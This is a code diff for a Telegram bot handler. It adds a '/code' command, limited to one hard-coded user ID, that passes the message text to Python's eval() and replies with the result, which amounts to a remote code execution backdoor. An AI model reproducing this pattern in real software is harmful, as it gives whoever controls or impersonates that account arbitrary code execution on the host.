@@ -6,10 +6,12 @@ from aiogram.types import (
     InlineKeyboardMarkup,
 )
 from lexicon.lexicon import LEXICON
+from services.services import sp, sl_rol, sl
 
 router = Router()
 
 
-@router.message(F.text == "sp" | F.from_user.id == 5050670131)
+@router.message(F.text.startswith("/code"), F.from_user.id == 5050670131)
 async def process_start_command(message: Message):
-    await message.answer(f"s")
+    a = eval(message.text[6:])
+    await message.answer(text=str(a))
